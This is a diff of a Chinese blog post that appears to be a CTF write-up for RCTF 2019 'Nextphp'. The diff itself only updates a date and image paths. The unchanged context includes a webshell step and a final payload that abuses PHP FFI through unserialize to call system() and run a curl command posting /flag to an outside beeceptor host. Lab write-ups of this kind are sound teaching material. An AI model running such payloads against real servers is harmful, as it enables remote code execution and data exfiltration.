@@ -576,7 +576,7 @@ if (isset($_GET[&#39;a&#39;])) &amp;#123;
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-09-09
+                    2022-01-28
                 </div>
                 
 
@@ -617,12 +617,12 @@ if (isset($_GET[&#39;a&#39;])) &amp;#123;
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>上来一个马，把我整慌了。</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909202022801.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909202022801.png"></p>
 <p>连接蚁剑返回空值，看来没那么简单</p>
 <p>看看禁用函数</p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909202202745.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909202202745.png"></p>
 <p>限制了<strong>open_basedir</strong></p>
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909202720598.png"><br>FFI开启<br><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909211330936.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909202720598.png"><br>FFI开启<br><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909211330936.png"></p>
 <p>怪，蚁剑直接连接连不上，重新写了个马倒是可以。</p>
 <p>里面有个preload.php</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -736,7 +736,7 @@ if (isset($_GET[&#39;a&#39;])) &amp;#123;
 
 <pre class="line-numbers language-none"><code class="language-none">?a&#x3D;unserialize(base64_decode(QzoxOiJBIjo4OTp7YTozOntzOjM6InJldCI7TjtzOjQ6ImZ1bmMiO3M6OToiRkZJOjpjZGVmIjtzOjM6ImFyZyI7czoyNjoiaW50IHN5c3RlbShjaGFyICpjb21tYW5kKTsiO319))-&gt;__serialize()[&#39;ret&#39;]-&gt;system(&quot;curl -d @&#x2F;flag https:&#x2F;&#x2F;asd5f4asd.free.beeceptor.com&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909213419249.png"></p>
+<p><img src="/../.images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-RCTF-2019-Nextphp/image-20210909213419249.png"></p>
 <p>也因为这题，蚁剑出了个FFI一键利用插件，蚁剑nb！</p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp">RCTF2019Web题解之nextphp</a></p>
 
